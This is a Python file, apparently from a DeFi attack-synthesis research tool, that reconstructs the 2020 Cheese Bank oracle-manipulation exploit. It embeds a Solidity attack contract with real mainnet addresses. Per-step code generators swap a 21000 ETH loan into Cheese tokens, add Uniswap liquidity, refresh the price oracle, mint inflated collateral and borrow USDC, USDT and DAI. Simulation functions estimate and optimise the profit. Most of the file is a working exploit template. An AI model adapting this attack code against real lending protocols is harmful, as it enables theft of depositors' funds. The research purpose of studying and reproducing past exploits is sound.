import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *


class CheeseBankAction():
    initialStates = [291933, 85, 4880, 149]
    globalStates = [291933, 85, 4880, 149]
    # globalStates[0]: Uniswap Cheese liquidity   
    # globalStates[1]: Uniswap WETH liquidity  
    # globalStates[2]: Uniswap LP total supply
    # globalStates[3]: Uniswap Cheese price
    

    initialBalances = {"ETH": 21000}
    currentBalances = {"ETH": 21000}
    TargetTokens = {'ETH', 'USDC', 'USDT', 'DAI'}
    TokenPrices = {'USDC': 1.0, 'USDT':1.0, "DAI": 1.0, "ETH": 443.2}

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/CheeseBankI.sol";
// Block 11205648
// Block index 106
// Timestamp Fri, 06 Nov 2020 19:22:21 +0000
// Gas price 29 gwei
// Gas limit 3732594
// tx: 0x600a869aa3a259158310a233b815ff67ca41eab8961a49918c2031297a02f1cc


// orginal hacker's rabbit hole 1: 02b7165d0916e373f
// orginal hacker's rabbit hole 2: 0x02b7165d0916e37



contract cheeseBank_attack {
    address private EOA;
    address private WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private StateraAddress = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address private BalancerAddress = 0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682;
    address private UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private CheeseTokenAddress = 0xA04bDB1f11413a84D1F6C1d4d4FeD0208F2e68bF;
    address private UniswapV2PairAddress = 0x534f2675Ff7B4161E46277b5914D33a5cB8DcF32;
    address private UnitrollerAddress = 0xdE2289695220531dfCf481FE3554D1C9C3156BA3;
    address private CheeseETHAddress = 0x7e4956688367fB28de3C0A62193f59b1526a00e7;
    address private CheesePriceOracleAddress = 0x833e440332cAA07597a5116FBB6163f0E15F743D;
    address private USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private CheeseUSDCAddress = 0x5E181bDde2fA8af7265CB3124735E9a13779c021;
    address private USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private CheeseUSDTAddress = 0x4c2a8A820940003cfE4a16294B239C8C55F29695;
    address private DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private CheeseDAIAddress = 0xA80e737Ded94E8D2483ec8d2E52892D9Eb94cF1f;

    IERC20 CheeseToken = IERC20(CheeseTokenAddress);
    IUniswapV2Router02 UniswapV2Router02 = IUniswapV2Router02(UniswapV2Router02Address);
    IERC20 USDC = IERC20(USDCAddress);
    IERC20 USDT = IERC20(USDTAddress);
    IERC20 DAI = IERC20(DAIAddress);
    address UNI_V2Address = 0x534f2675Ff7B4161E46277b5914D33a5cB8DcF32;
    IUniswapV2Pair UNI_V2 = IUniswapV2Pair(UNI_V2Address);

    uint256 balance1 = 0;
    uint256 balance2 = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";
    string str83 = "";
    string str84 = "";

    uint reserve0;
    uint reserve1;
    uint ETHcost;
    uint cheeseCost;
    string[] str;
    uint price;

    address[] ad; 

    // address unitrollerAddress = 0x3C7274679FF9d090889Ed8131218bdc871020391;
    address unitrollerAddress = 0xdE2289695220531dfCf481FE3554D1C9C3156BA3;
    Comptroller Unitroller = Comptroller(unitrollerAddress);

    uint Cheesegot;

    constructor() payable {
        require(msg.value == 21000 ether, "loan amount does not match");
        CheeseToken.approve(UniswapV2Router02Address, 2**256-1);
        IERC20(UniswapV2PairAddress).approve(CheeseETHAddress, 2**256 -1);
        address[] memory ad2 = new address[](1);
        ad2[0] = CheeseETHAddress;
        ComptrollerInterface(UnitrollerAddress).enterMarkets(ad2);
        str = new string[](1);
        ad = new address[](2);
        EOA = msg.sender;
    }

    receive() external payable {}
    '''

    startStr_attack = '''
    // loan amount = 21000 ether 
    function attack( $$_$$ ) public {
'''

    endStr_attack = '''
            revert(ProfitSummary());
    }
    '''

    endStr_contract = '''
    function UniswapSummary() internal returns (string memory _uintAsString) {
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        str80 = appendWithSpace("Cheese balance: ", uint2str(reserve0 / 10 ** 18));
        str81 = appendWithSpace("WETH balance: ", uint2str(reserve1 / 10 ** 18));
        return appendWithSpace(str80, str81);
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        balance1 = address(this).balance / 10 ** 18;
        balance2 = USDC.balanceOf(address(this)) / 10 ** 6;
        str80 = append("ETH balance: ", uint2str(balance1));
        str81 = append(" || USDC balance: ", uint2str(balance2));
        str80 = appendWithSpace(str80, str81);

        balance1 = USDT.balanceOf(address(this)) / 10 ** 6;
        balance2 = DAI.balanceOf(address(this)) / 10 ** 18;
        str82= append(" || USDT balance: ", uint2str(balance1));
        str83 = append(" || DAI balance: ", uint2str(balance2));
        str82 = appendWithSpace(str82, str83);

        return append(str80, str82);
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}    
    '''

    
    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()
    
    def calcProfit(stats):
        if stats == None or len(stats) != 4:
            return 0
        profit = (stats[0]-21000)*443.2 + stats[1]+stats[2]+stats[3]
        #        ETH                           3 Stable coins       
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit
    
    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)



class SwapUniswapETH2LP(CheeseBankAction):
    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['LP']
    range = [0, 100] # 50

    @classmethod
    def actionStr(cls):
        action = '''        // Action:  SwapUniswapETH2LP
        Cheesegot = CheeseToken.balanceOf(address(this));
        ad[0] = WETHAddress;
        ad[1] = CheeseTokenAddress;
        UniswapV2Router02.swapExactETHForTokens{value: $$ * 10 ** 18}(0, ad, address(this), 2000000000);
        Cheesegot = CheeseToken.balanceOf(address(this)) - Cheesegot;
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        ETHcost = Cheesegot * reserve1 / reserve0;
        UniswapV2Router02.addLiquidityETH{value: ETHcost}(CheeseTokenAddress, Cheesegot, 0, 0, address(this), 2000000000);
        '''
        return action

    @classmethod
    def simulate(cls, input):
        # step 1: swap ETH for Cheese
        newWETHLiquidity = cls.globalStates[1] + input  # WETH
        CheeseOut = 997 * input * cls.globalStates[0] / (1000 * cls.globalStates[1]  + 997 * input)
        newCheeseLiquidity =  cls.globalStates[0] - CheeseOut

        # step 2: swap ETH + Cheese for LP
        LPGot = CheeseOut / newCheeseLiquidity * cls.globalStates[2]
        ETHCost = CheeseOut * newWETHLiquidity / newCheeseLiquidity
        newCheeseLiquidity = newCheeseLiquidity + CheeseOut  
        newWETHLiquidity = newWETHLiquidity + ETHCost
   
        return newCheeseLiquidity, newWETHLiquidity, ETHCost, LPGot

    @classmethod
    def transit(cls, input):
        cls.currentBalances["ETH"] -= input

        newCheeseLiquidity, newWETHLiquidity, ETHCost, LPGot = cls.simulate(input)

        cls.globalStates[0] = newCheeseLiquidity
        cls.globalStates[1] = newWETHLiquidity
        if "LP" not in cls.currentBalances:
            cls.currentBalances["LP"] = LPGot
        else:
            cls.currentBalances["LP"] += LPGot
        cls.currentBalances["ETH"] -= ETHCost
        cls.globalStates[2] += LPGot
        return 

    @classmethod
    def string(cls):
        return cls.__name__


class SwapUniswapETH2Cheese(CheeseBankAction):
    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['Cheese']
    range = [0, 21000] # 50 and 20000

    @classmethod
    def actionStr(cls):
        action = '''        // Action:  SwapUniswapETH2Cheese
        ad[0] = WETHAddress;
        ad[1] = CheeseTokenAddress;
        UniswapV2Router02.swapExactETHForTokens{value: $$ * 10 ** 18}(0, ad, address(this), 2000000000);
        '''
        return action

    @classmethod
    def simulate(cls, input):
        newWETHLiquidity = cls.globalStates[1] + input  # WETH
        CheeseOut = 997 * input * cls.globalStates[0] / (1000 * cls.globalStates[1]  + 997 * input)
        newCheeseLiquidity =  cls.globalStates[0] - CheeseOut
        return newCheeseLiquidity, newWETHLiquidity, CheeseOut

    @classmethod
    def transit(cls, input):
        cls.currentBalances["ETH"] -= input

        newCheeseLiquidity, newWETHLiquidity, CheeseOut = cls.simulate(input)

        cls.globalStates[0] = newCheeseLiquidity
        cls.globalStates[1] = newWETHLiquidity
        if "Cheese" not in cls.currentBalances.keys():
            cls.currentBalances["Cheese"] = 0
        cls.currentBalances["Cheese"] += CheeseOut
        return 

    @classmethod
    def string(cls):
        return "SwapUniswapETH2Cheese"


class RefreshCheeseBank(CheeseBankAction):
    numInputs = 0
    tokensIn = []
    tokensOut = []
    range = [] 

    @classmethod
    def actionStr(cls):
        action = "      // Action: refresh\n"
        action += '''       str[0] = "UNI_V2-CHEESE-ETH";
        CheesePriceOracle(CheesePriceOracleAddress).refresh(str);
        '''
        return action


    @classmethod
    def simulate(cls):
        NowAnchorPrice = 393713653
        WETHbalance = cls.globalStates[1]
        totalSupply = cls.globalStates[2]
        pairbalance = WETHbalance * 2
        totalValue = pairbalance * NowAnchorPrice
        AnchorLPprice = totalValue / totalSupply
        AnchorLPprice = AnchorLPprice / 10 ** 5
        return AnchorLPprice
        

    @classmethod
    def transit(cls): # Assume input is a value
        output0 = cls.simulate()
        cls.globalStates[3] = output0
        return

    @classmethod
    def string(cls):
        return "RefreshCheeseBank"


class LP2LQ(CheeseBankAction):
    numInputs = 1
    range = [0, 80184]  # 66184
    tokensIn = ['LP']
    tokensOut = ['LQ']

    @classmethod
    def actionStr(cls):
        action = "      // Action: LP2LQ\n"
        action += '''       cERC20(CheeseETHAddress).mint($$ * 10 ** 18);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        output0 = 0.06 * input * cls.globalStates[3]
        return output0

    @classmethod
    def transit(cls, input):
        cls.currentBalances['LP'] -= input
        output0 = cls.simulate(input)
        if 'LQ' not in cls.currentBalances:
            cls.currentBalances['LQ'] = 0
        cls.currentBalances['LQ'] += output0
        return

    @classmethod
    def string(cls):
        return "LP2LQ"

class BorrowCheese_USDC(CheeseBankAction):
    numInputs = 1
    tokensIn = ['LQ']
    tokensOut = ['USDC']
    range = [0, 2068252] # 2068252

    @classmethod
    def actionStr(cls):
        action = "      // Action: BorrowCheese_USDC\n"
        action += '''               cERC20(CheeseUSDCAddress).borrow( $$ * 10 ** 6);\n'''
        return action

    @classmethod
    def transit(cls, input):        
        if 'USDC' not in cls.currentBalances:
            cls.currentBalances['USDC'] = 0
        
        cls.currentBalances['LQ'] -= input 

        if cls.currentBalances['LQ'] >= 0:
            cls.currentBalances['USDC'] += input

        return

    @classmethod
    def string(cls):
        return "BorrowCheese_USDC"

class BorrowCheese_USDT(CheeseBankAction):
    numInputs = 1
    tokensIn = ['LQ']
    tokensOut = ['USDT']
    range = [0, 1237995] # 1237995

    @classmethod
    def actionStr(cls):
        action = "      // Action: BorrowCheese_USDT\n"
        action += '''               cERC20(CheeseUSDTAddress).borrow( $$ * 10 ** 6);\n'''
        return action

    @classmethod
    def transit(cls, input):        
        if 'USDT' not in cls.currentBalances:
            cls.currentBalances['USDT'] = 0
        
        cls.currentBalances['LQ'] -= input 
        if cls.currentBalances['LQ'] >= 0:
            cls.currentBalances['USDT'] += input

        return

    @classmethod
    def string(cls):
        return "BorrowCheese_USDT"

class BorrowCheese_DAI(CheeseBankAction):
    numInputs = 1
    tokensIn = ['LQ']
    tokensOut = ['DAI']
    range = [0, 87586] # 87586
    
    @classmethod
    def actionStr(cls):
        action = "      // Action: BorrowCheese_DAI\n"
        action += '''               cERC20(CheeseDAIAddress).borrow( $$ * 10 ** 18);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        output0 = input * 1.0088484461
        return output0

    @classmethod
    def transit(cls, input):        
        output0 = cls.simulate(input)
            
        if 'DAI' not in cls.currentBalances:
            cls.currentBalances['DAI'] = 0

        cls.currentBalances['LQ'] -= output0
        if  cls.currentBalances['LQ'] >= 0:
            cls.currentBalances['DAI'] += input
        return

    @classmethod
    def string(cls):
        return "BorrowCheese_DAI"


class SwapUniswapCheese2ETH(CheeseBankAction):
    numInputs = 1
    tokensIn = ['Cheese']
    tokensOut = ['ETH']
    range = [0, 300000] # 288822

    @classmethod
    def actionStr(cls):
        action = '''        // Action:  SwapUniswapETH2Cheese
        ad[0] = CheeseTokenAddress;
        ad[1] = WETHAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapExactTokensForETH( $$ * 10 ** 18, 0, ad, address(this), 2000000000);
        '''
        return action

    @classmethod
    def simulate(cls, input):
        newCheeseLiquidity = cls.globalStates[0] + input 
        ETHOut = 997 * input * cls.globalStates[1] / (1000 * cls.globalStates[0]  + 997 * input)
        newWETHLiquidity = cls.globalStates[1] - ETHOut
        return newCheeseLiquidity, newWETHLiquidity, ETHOut

    @classmethod
    def transit(cls, input):
        cls.currentBalances["Cheese"] -= input

        newCheeseLiquidity, newWETHLiquidity, ETHOut = cls.simulate(input)

        cls.globalStates[0] = newCheeseLiquidity
        cls.globalStates[1] = newWETHLiquidity
        cls.currentBalances["ETH"] += ETHOut
        return 

    @classmethod
    def string(cls):
        return "SwapUniswapCheese2ETH"



def main():
    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 21000
    config.blockNum = 11205647
    config.contract_name = "cheeseBank_attack"

    
# Test for initial pass of data collecton: 


    action1 = SwapUniswapETH2LP
    action2 = SwapUniswapETH2Cheese
    action3 = RefreshCheeseBank
    action4 = LP2LQ
    action5 = BorrowCheese_USDC
    action6 = BorrowCheese_USDT
    action7 = BorrowCheese_DAI
    action8 = SwapUniswapCheese2ETH

    action_list = [action1, action2, action3, action4, action5, action6, action7, action8]
    initial_guess = [50, 20000, 2833, 2068252, 1237995, 87586, 288822]
    ActionWrapper = CheeseBankAction

   # Optimize(action_list, ActionWrapper)
   
    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    actual_profit = 3335773.8
    print("actual profit: ", actual_profit)
    estimate_profit = getEstimatedProfit_precise_display(initial_guess, ActionWrapper, action_list, True)
    print("estimated profit: ", estimate_profit)
    return actual_profit, estimate_profit




if __name__ == '__main__':
    main()
    